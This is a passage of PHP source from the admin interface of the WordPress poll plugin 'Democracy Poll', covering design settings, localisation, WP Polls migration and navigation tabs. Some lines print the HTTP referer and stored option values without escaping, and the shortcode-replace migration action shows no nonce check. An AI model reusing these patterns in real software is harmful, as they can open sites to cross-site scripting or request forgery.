											<input disabled class="' . $unique . 'dem__checkbox demdummy" type="checkbox" /><span class="dem__spot"></span>
										</label>
										<label class="' . $unique . 'dem__checkbox_label demdummy">
											<input disabled class="' . $unique . 'dem__checkbox" checked="true" type="checkbox" /><span class="dem__spot"></span>
										</label>
									</div>

									' . $fname . '
								<span>
							</label>

						</div>
						';
					}
					?>
				</li>
			</ul>


			<!--Button-->
			<ul class="group">
				<li class="title"><?= esc_html__( 'Button', 'democracy-poll' ); ?></li>
				<li class="block buttons">

					<div class="btn_select_wrap selectable_els">
						<label>
							<input type="radio" value=""
							       name="dem[css_button]" <?php checked( demopt()->css_button, '' ) ?> />
							<span class="radio_content">
									<input type="button" value="<?= esc_attr__( 'No (default)', 'democracy-poll' ); ?>"/>
								</span>
						</label>

						<?php
						$data = [];
						$i = 0;
						foreach( glob( DEMOC_PATH . 'styles/buttons/*' ) as $file ){
							if( is_dir( $file ) ){
								continue;
							}

							$fname = basename( $file );
							$button_class = 'dem-button' . ++$i;
							$css = "/*reset*/\n.$button_class{position: relative; display:inline-block; text-decoration: none; user-select: none; outline: none; line-height: 1; border:0;}\n";
							$css .= str_replace( 'dem-button', $button_class, file_get_contents( $file ) ); // стили кнопки

							if( demopt()->css_button ){
								$bbg = demopt()->btn_bg_color;
								$bcolor = demopt()->btn_color;
								$bbcolor = demopt()->btn_border_color;
								// hover
								$bh_bg = demopt()->btn_hov_bg;
								$bh_color = demopt()->btn_hov_color;
								$bh_bcolor = demopt()->btn_hov_border_color;

								if( $bbg ){
									$css .= "\n.$button_class{ background-color:$bbg !important; }\n";
								}
								if( $bcolor ){
									$css .= ".$button_class{ color:$bcolor !important; }\n";
								}
								if( $bbcolor ){
									$css .= ".$button_class{ border-color:$bbcolor !important; }\n";
								}
								if( $bh_bg ){
									$css .= "\n.$button_class:hover{ background-color:$bh_bg !important; }\n";
								}
								if( $bh_color ){
									$css .= ".$button_class:hover{ color:$bh_color !important; }\n";
								}
								if( $bh_bcolor ){
									$css .= ".$button_class:hover{ border-color:$bh_bcolor !important; }\n";
								}
							}
							?>
							<style><?= $css ?></style>

							<label>
								<input type="radio" value="<?= esc_attr( $fname ) ?>"
								       name="dem[css_button]" <?php checked( demopt()->css_button, $fname ) ?> />
								<span class="radio_content">
										<input type="button" value="<?= esc_attr( $fname ) ?>"
										       class="<?= $button_class ?>">
									</span>
							</label>
							<?php
						}
						?>
					</div>
					<div class="clearfix"></div>
					<br>

					<p style="float:left; margin-right:3em;">
						<?= esc_html__( 'Button colors', 'democracy-poll' ) ?><br>

						<input type="text" class="iris_color" name="dem[btn_bg_color]"
						       value="<?= demopt()->btn_bg_color ?>">
						<?= esc_html__( 'Bg color', 'democracy-poll' ) ?><br>

						<input type="text" class="iris_color" name="dem[btn_color]"
						       value="<?= demopt()->btn_color ?>">
						<?= esc_html__( 'Text Color', 'democracy-poll' ) ?><br>

						<input type="text" class="iris_color" name="dem[btn_border_color]"
						       value="<?= demopt()->btn_border_color ?>">
						<?= esc_html__( 'Border Color', 'democracy-poll' ) ?>
					</p>
					<p style="float:left; margin-right:3em;">
						<?= esc_html__( 'Hover button colors', 'democracy-poll' ) ?><br>

						<input type="text" class="iris_color" name="dem[btn_hov_bg]"
						       value="<?= demopt()->btn_hov_bg ?>">
						<?= esc_html__( 'Bg color', 'democracy-poll' ) ?><br>

						<input type="text" class="iris_color" name="dem[btn_hov_color]"
						       value="<?= demopt()->btn_hov_color ?>">
						<?= esc_html__( 'Text Color', 'democracy-poll' ) ?><br>

						<input type="text" class="iris_color" name="dem[btn_hov_border_color]"
						       value="<?= demopt()->btn_hov_border_color ?>">
						<?= esc_html__( 'Border Color', 'democracy-poll' ) ?>
					</p>
					<div class="clearfix"></div>
					<em>
						<?= esc_html__( 'The colors correctly affects NOT for all buttons. You can change styles completely in "additional styles" field bellow.', 'democracy-poll' ) ?>
					</em>


					<!--<hr>-->
					<label style="margin-top:3em;">
						<input type="text" name="dem[btn_class]" value="<?= demopt()->btn_class ?>">
						<em><?= esc_html__( 'An additional css class for all buttons in the poll. When the template has a special class for buttons, for example <code>btn btn-info</code>', 'democracy-poll' ) ?></em>
					</label>
				</li>

			</ul>


			<!-- AJAX loader -->
			<ul class="group">
				<li class="title"><?= esc_html__( 'AJAX loader', 'democracy-poll' ); ?></li>
				<li class="block loaders" style="text-align:center;">

					<div class="selectable_els">
						<label class="lo_item" style="display: block; height:30px;">
							<input type="radio" value=""
							       name="dem[loader_fname]" <?php checked( demopt()->loader_fname, '' ) ?>>
							<span class="radio_content"><?= esc_html__( 'No (dots...)', 'democracy-poll' ); ?></span>
						</label>
						<br>
						<?php
						$data = [];
						foreach( glob( DEMOC_PATH . 'styles/loaders/*' ) as $file ){
							if( is_dir( $file ) ){
								continue;
							}
							$fname = basename( $file );
							$ex = preg_replace( '~.*\.~', '', $fname );
							$data[ $ex ][ $fname ] = $file;
						}
						foreach( $data as $ex => $val ){
							echo '<div class="clearfix"></div>' . "<h2 style='text-align:center;'>$ex</h2>"; //'';

							// поправим стили
							if( demopt()->loader_fill ){
								preg_match_all( '~\.dem-loader\s+\.(?:fill|stroke|css-fill)[^\{]*\{.*?\}~s', $demcss['base_css'], $match );
								echo "<style>" . str_replace( '.dem-loader', '.loader', implode( "\n", $match[0] ) ) . "</style>";
							}

							foreach( $val as $fname => $file ){
								?>
								<label class="lo_item <?= $ex ?>">
									<input type="radio" value="<?= $fname ?>"
									       name="dem[loader_fname]" <?php checked( demopt()->loader_fname, $fname ) ?>>
									<span class="radio_content">
											<div class="loader"><?= file_get_contents( $file ) ?></div>
											<?php //echo $ex
											?>
										</span>
								</label>
								<?php
							}
						}
						?>

					</div>

					<em>
						<?= esc_html__( 'AJAX Loader. If choose "NO", loader replaces by dots "..." which appends to a link/button text. SVG images animation don\'t work in IE 11 or lower, other browsers are supported at  90% (according to caniuse.com statistics).', 'democracy-poll' ) ?>
					</em>

					<input class="iris_color fill" name="dem[loader_fill]" type="text"
					       value="<?= demopt()->loader_fill ?>">

				</li>

			</ul>

			<!-- Custom styles -->
			<ul class="group">
				<li class="title"><?= esc_html__( 'Custom/Additional CSS styles', 'democracy-poll' ) ?></li>

				<li class="block" style="width:98%;">
					<p>
						<i><?php
							echo esc_html__( 'In this field you can add some additional css properties or completely replace current css theme. Write here css and it will be added at the bottom of current Democracy css. To complete replace styles, check "No theme" and describe all styles.', 'democracy-poll' );
							echo esc_html__( 'This field cleaned manually, if you reset options of this page or change/set another theme, the field will not be touched.', 'democracy-poll' );
							?></i>
					</p>
					<textarea name="additional_css" style="width:100%; min-height:50px; height:<?= $additional ? '300px' : '50px' ?>;"><?= esc_textarea( $additional ) ?></textarea>
				</li>
			</ul>

			<!-- Connected styles -->
			<p style="margin:2em 0; margin-top:5em; position:fixed; bottom:0; z-index:99;">
				<?php dem__design_submit_button() ?>
				<input type="submit" name="dem_reset_design_options" class="button"
				       value="<?= esc_attr__( 'Reset Options', 'democracy-poll' ) ?>" style="margin-left:4em;"
				       onclick="return confirm('<?= esc_attr__( 'are you sure?', 'democracy-poll' ) ?>');">
			</p>

			<ul class="group">
				<li class="title"><?= esc_html__( 'All CSS styles that uses now', 'democracy-poll' ) ?></li>
				<li class="block">
					<script>
						function select_kdfgu( that ){
							var sel = ( !! document.getSelection) ? document.getSelection() : ( !! window.getSelection) ? window.getSelection() : document.selection.createRange().text;
							if( sel == '' ) that.select();
						}
					</script>
					<em style="__opacity: 0.8;">
						<?= esc_html__( 'It\'s all collected css styles: theme, button, options. You can copy this styles to the "Custom/Additional CSS styles:" field, disable theme and change copied styles by itself.', 'democracy-poll' ) ?>
					</em>
					<textarea onmouseup="select_kdfgu(this);" onfocus="this.style.height = '700px';"
					          onblur="this.style.height = '100px';" readonly="true"
					          style="width:100%;min-height:100px;"><?php
						echo $demcss['base_css'] . "\n\n\n/* custom styles ------------------------------ */\n" . $demcss['additional_css'];
						?></textarea>

					<p><?= esc_html__( 'Minified version (uses to include it in HTML)', 'democracy-poll' ); ?></p>

					<textarea onmouseup="select_kdfgu(this);" readonly="true"
					          style="width:100%; min-height:10em;"><?= $demcss['minify'] ?></textarea>
				</li>
			</ul>

		</form>

	</div>
	<?php
}

function dem_l10n_options() {
	echo demenu();
	?>
	<div class="democr_options dempage_l10n">

		<?php dem__polls_preview(); ?>

		<form method="POST" action="">
			<?php
			wp_nonce_field( 'dem_adminform', '_demnonce' );

			// выводим таблицу

			echo '
			<table class="wp-list-table widefat fixed posts">
			<thead>
				<tr>
					<th>' . __( 'Original', 'democracy-poll' ) . '</th>
					<th>' . __( 'Your variant', 'democracy-poll' ) . '</th>
				</tr>
			</thead>
			<tbody id="the-list">
			';


			// отпарсим английский перевод из файла
			/*
			$mofile = DEMOC_PATH . DEM_DOMAIN_PATH . '/'. get_locale() .'.mo';
			if( file_exists($mofile) ){
				$mo = new MO();
				$mo->import_from_file( $mofile );
				$mo = $mo->entries;
			}
			*/
			// получим все переводы из файлов
			$strs = [];
			$files = [
				DEMOC_PATH . 'classes/DemPoll.php',
				DEMOC_PATH . 'classes/Poll_Widget.php',
			];
			foreach( $files as $file ){
				preg_match_all( '~_x\(\s*[\'](.*?)(?<!\\\\)[\']~', file_get_contents( $file ), $match );
				if( $match[1] ){
					/** @noinspection SlowArrayOperationsInLoopInspection */
					$strs = array_merge( $strs, $match[1] );
				}
			}
			$strs = array_unique( $strs );

			$i = 0;
			$_l10n = get_option( 'democracy_l10n' );
			remove_filter( 'gettext_with_context', [ Democracy_Poll::class, 'handle_front_l10n' ], 10, 4 );
			foreach( $strs as $str ){
				$i++;
				$mo_str = call_user_func( '_x', $str, 'front', 'democracy-poll' );
				//if( $translated !== $str ) $mo_str = (  ) ? isset($mo) && isset($mo[$str]) ) ? $mo[$str]->translations[0] : $str;

				$l10ed_str = ( ! empty( $_l10n[ $str ] ) && $_l10n[ $str ] !== $mo_str ) ? $_l10n[ $str ] : '';

				echo '
				<tr class="' . ( $i % 2 ? 'alternate' : '' ) . '">
					<td>' . esc_html( $mo_str ) . '</td>
					<td><textarea style="width:100%; height:30px;" name="l10n[' . esc_attr( $str ) . ']">' . esc_textarea( $l10ed_str ) . '</textarea></td>
				</tr>';
			}
			add_filter( 'gettext_with_context', [ Democracy_Poll::class, 'handle_front_l10n' ], 10, 4 );
			echo '<tbody>
			</table>';
			?>
			<p>
				<input class="button-primary" type="submit" name="dem_save_l10n"
				       value="<?= esc_attr__( 'Save Text', 'democracy-poll' ); ?>">
				<input class="button" type="submit" name="dem_reset_l10n"
				       value="<?= esc_attr__( 'Reset Options', 'democracy-poll' ); ?>">
			</p>

		</form>

	</div>
	<?php
}

function dem_migration_subpage() {

	$migration = get_option( 'democracy_migrated' );

	// handlers
	if( ! empty( $migration['wp-polls'] ) ){
		$moreaction = &$_GET['moreaction'];

		// замена шорткодов
		if( in_array( $moreaction, [ 'replace_shortcode', 'restore_shortcode_replace' ] ) ){
			global $wpdb;

			$count = 0;

			$poll_ids_old_new = wp_list_pluck( $migration['wp-polls'], 'new_poll_id' );

			foreach( $poll_ids_old_new as $old => $new ){
				$_new = '[democracy id="' . (int) $new . '"]';
				$_old = '[poll id="' . (int) $old . '"]';

				if( $moreaction === 'replace_shortcode' ){
					$rep_from = $_old;
					$rep_to = $_new;
				}
				elseif( $moreaction === 'restore_shortcode_replace' ){
					$rep_from = $_new;
					$rep_to = $_old;
				}

				if( $rep_from && $rep_to ){
					$count += $wpdb->query( "UPDATE $wpdb->posts SET post_content = REPLACE( post_content, '$rep_from', '$rep_to' ) WHERE post_type NOT IN ('attachment','revision')" );
				}
			}

			democr()->msg->add_ok( sprintf( __( 'Shortcodes replaced: %s', 'democracy-poll' ), $count ) );
		}

		// Удаление данных о миграции
		if( $moreaction === 'delete_wp-polls_info' ){
			delete_option( 'democracy_migrated' );

			democr()->msg->add_ok( __( 'Data of migration deleted', 'democracy-poll' ) );

			echo demenu(); // выводит сообщения

			return; // важно!
		}
	}

	if( @ $_GET['from'] === 'wp-polls' ){
		( new \DemocracyPoll\Utils\Migrator__WP_Polls() )->migrate();
	}

	$migration = get_option( 'democracy_migrated' ); // дуль нужен!

	//print_r(wp_list_pluck( $wppolls, 'answers:old->new' ));

	echo demenu();
	?>
	<div class="democr_options">
		<?php
		// Миграция WP Polls
		if( $wppolls = &$migration['wp-polls'] ){
			$count_polls = count( wp_list_pluck( $wppolls, 'new_poll_id' ) );

			$count_answe = 0;
			foreach( wp_list_pluck( $wppolls, 'answers:old->new' ) as $val ){
				$count_answe += count( $val );
			}

			$count_logs = 0;
			foreach( wp_list_pluck( $wppolls, 'logs_created' ) as $val ){
				$count_logs += count( $val );
			}

			echo '
			<h3>' . __( 'Migration from WP Polls done', 'democracy-poll' ) . '</h3>
			<p>' . sprintf( __( 'Polls copied: %d. Answers copied: %d. Logs copied: %d', 'democracy-poll' ), $count_polls, $count_answe, $count_logs ) . '</p>
			<p>
				<a class="button" href="' . esc_url( add_query_arg( 'moreaction', 'replace_shortcode' ) ) . '">' . __( 'Replace WP Polls shortcodes in posts', 'democracy-poll' ) . '</a> <=>
				<a class="button" href="' . esc_url( add_query_arg( 'moreaction', 'restore_shortcode_replace' ) ) . '">' . __( 'Cancel the shortcode replace and reset changes', 'democracy-poll' ) . '</a>
			</p>
			<br>
			<p>
				<a class="button button-small" style="opacity:.5;" href="' . esc_url( add_query_arg( 'moreaction', 'delete_wp-polls_info' ) ) . '" onclick="return confirm(\'' . __( 'Are you sure?', 'democracy-poll' ) . '\');">' . __( 'Delete all data about WP Polls migration', 'democracy-poll' ) . '</a>
			</p>
			';
		}
		?>
	</div>
	<?php
}

/**
 * Выводит все меню админки. Ссылки: с подстраниц на главную страницу и умный referer
 *
 * Выводит сообщения об ошибках и успехах.
 *
 * @return null echo HTML.
 */
function demenu() {

	if( 'back link' ){
		$transient = 'democracy_referer';
		$mainpage = wp_make_link_relative( democr()->admin_page_url() );
		$referer = isset( $_SERVER['HTTP_REFERER'] ) ? wp_make_link_relative( $_SERVER['HTTP_REFERER'] ) : '';

		// если обновляем
		if( $referer == $_SERVER['REQUEST_URI'] ){
			$referer = get_transient( $transient );
		}
		// если запрос пришел с любой страницы настроект democracy
		elseif( false !== strpos( $referer, $mainpage ) ){
			$referer = false;
			set_transient( $transient, 'foo', 2 ); // удаляем. но не удалим, а обновим, так чтобы не работала
		}
		else{
			set_transient( $transient, $referer, HOUR_IN_SECONDS / 2 );
		}
	}

	if( isset( $_GET['edit_poll'] ) ){
		$_GET['subpage'] = 'add_new';
	} // костыль

	$fn__current = function( $page ) {
		return ( @ $_GET['subpage'] == $page ) ? ' nav-tab-active' : '';
	};

	$out = ''; //'<h2>'. __('Democracy Poll','democracy-poll') .'<h2>';
	$out .= '<h2 class="nav-tab-wrapper nav-tab-small" style="margin-bottom:1em;">' .
	        ( $referer ? '<a class="nav-tab" href="' . $referer . '" style="margin-right:20px;">← ' . __( 'Back', 'democracy-poll' ) . '</a>' : '' ) .
	        '<a class="nav-tab' . $fn__current( '' ) . '" href="' . $mainpage . '">' . __( 'Polls List', 'democracy-poll' ) . '</a>' .
	        '<a class="nav-tab' . $fn__current( 'add_new' ) . '" href="' . add_query_arg( [ 'subpage' => 'add_new' ], $mainpage ) . '">' . __( 'Add new poll', 'democracy-poll' ) . '</a>' .
	        '<a style="margin-right:1em;" class="nav-tab' . $fn__current( 'logs' ) . '" href="' . add_query_arg( [ 'subpage' => 'logs' ], $mainpage ) . '">' . __( 'Logs', 'democracy-poll' ) . '</a>' .
	        ( democr()->super_access ? (
		        '<a class="nav-tab' . $fn__current( 'general_settings' ) . '" href="' . add_query_arg( [ 'subpage' => 'general_settings' ], $mainpage ) . '">' . __( 'Settings', 'democracy-poll' ) . '</a>' .
		        '<a class="nav-tab' . $fn__current( 'design' ) . '" href="' . add_query_arg( [ 'subpage' => 'design' ], $mainpage ) . '">' . __( 'Theme Settings', 'democracy-poll' ) . '</a>' .
		        '<a class="nav-tab' . $fn__current( 'l10n' ) . '" href="' . add_query_arg( [ 'subpage' => 'l10n' ], $mainpage ) . '">' . __( 'Texts changes', 'democracy-poll' ) . '</a>'
	        ) : '' ) .
	        '</h2>';

	if( democr()->super_access && in_array( @ $_GET['subpage'], [ 'general_settings', 'design', 'l10n' ] ) ){
		$out .= dem__info_bar();
	}

	// сообщения
	$out .= democr()->msg->messages_html();

	return $out;
}

/**
 * Выводит HTML блока информации обо всем на свете :)
 */
function dem__info_bar() {
	ob_start();

	?>
	<style>
		/* info bar */
		.democr_options{ float: left; width: 80%; }

		.dem_info_wrap{ width: 17%; position: fixed; right: 0; padding: 2em 0; }

		@media screen and ( max-width: 1400px ){
			.democr_options{ float: none; width: 100%; }

			.dem_info_wrap{ display: none; }
		}
	</style>
	<div class="dem_info_wrap">
		<div class="infoblk">
			<?php
			echo str_replace(
				'<a',
				'<a target="_blank" href="https://wordpress.org/support/plugin/democracy-poll/reviews/#new-post"',
				__( 'If you like this plugin, please <a>leave your review</a>', 'democracy-poll' )
			);
			?>
		</div>
	</div>
	<?php

	return ob_get_clean();
}

/**
 * Выводит кнопки активации/деактивации опроса.
 *
 * @param object $poll  Объект опроса.
 * @param string $url   УРЛ страницы ссылки, которую нужно обработать.
 *
 * @return string HTML.
 */
function dem_activatation_buttons( $poll, $icon_reverse = false ) {
	if( $poll->active ){
		$out = '<a class="button" href="' . esc_url( dem__add_nonce( add_query_arg( [
				'dmc_deactivate_poll' => $poll->id,
				'dmc_activate_poll'   => null,
			] ) ) ) . '" title="' . __( 'Deactivate', 'democracy-poll' ) . '"><span class="dashicons dashicons-controls-' . ( $icon_reverse ? 'play' : 'pause' ) . '"></span></a>';
	}
	else{
		$out = '<a class="button" href="' . esc_url( dem__add_nonce( add_query_arg( [
				'dmc_deactivate_poll' => null,
				'dmc_activate_poll'   => $poll->id,
			] ) ) ) . '" title="' . __( 'Activate', 'democracy-poll' ) . '"><span class="dashicons dashicons-controls-' . ( $icon_reverse ? 'pause' : 'play' ) . '"></span></a>';
	}

	return $out;
}

/**
 * Выводит кнопки открытия/закрытия опроса.
 *
 * @param object $poll  Объект опроса.
 * @param string $url   УРЛ страницы ссылки, которую нужно обработать.
 *
 * @return string HTML.
 */
function dem_opening_buttons( $poll, $icon_reverse = false ) {

	if( $poll->open ){

		$out = '<a class="button" href="' . esc_url( dem__add_nonce( add_query_arg( [
				'dmc_close_poll' => $poll->id,
				'dmc_open_poll'  => null,
			] ) ) ) . '" title="' . __( 'Close voting', 'democracy-poll' ) . '"><span class="dashicons dashicons-' . ( $icon_reverse ? 'yes' : 'no' ) . '"></span></a>';
	}
	else{

		$out = '<a class="button" href="' . esc_url( dem__add_nonce( add_query_arg( [
				'dmc_close_poll' => null,
				'dmc_open_poll'  => $poll->id,
			] ) ) ) . '" title="' . __( 'Open voting', 'democracy-poll' ) . '"><span class="dashicons dashicons-' . ( $icon_reverse ? 'no' : 'yes' ) . '"></span></a>';
	}

	return $out;
}

function dem__polls_preview() {
	?>
	<ul class="group">
		<li class="block polls-preview">
			<?php
			$poll = new DemPoll();

			if( $poll->id ){
				$poll->cachegear_on = false;

				//$poll->has_voted = 1;
				$answers = (array) wp_list_pluck( $poll->poll->answers, 'aid' );
				$poll->votedFor = $answers ? $answers[ array_rand( $answers ) ] : false;

				$fn__replace = static function( $val ) {
					return str_replace( [/*'checked="checked"',*/ 'disabled="disabled"' ], '', $val );
				};

				echo '<div class="poll"><p class="tit">' . __( 'Results view:', 'democracy-poll' ) . '</p>' . $fn__replace( $poll->get_screen( 'voted' ) ) . '</div>';

				echo '<div class="poll"><p class="tit">' . __( 'Vote view:', 'democracy-poll' ) . '</p>' . $fn__replace( $poll->get_screen( 'force_vote' ) ) . '</div>';

				echo '<div class="poll show-loader"><p class="tit">' . __( 'AJAX loader view:', 'democracy-poll' ) . '</p>' . $fn__replace( $poll->get_screen( 'vote' ) ) . '</div>';
			}
			else{
				echo 'no data or no active polls...';
			}

			if( @ $_GET['subpage'] === 'design' ){
				echo '<input type="text" class="iris_color preview-bg">';
			}
			?>

		</li>
	</ul>
	<?php
}

function dem__design_submit_button() {
	?>
	<input type="submit" name="dem_save_design_options" class="button-primary"
	       value="<?= esc_attr__( 'Save All Changes', 'democracy-poll' ) ?>">
	<?php
}

function dem__add_nonce( $url ) {
	return add_query_arg( [ '_demnonce' => wp_create_nonce( 'dem_adminform' ) ], $url );
}


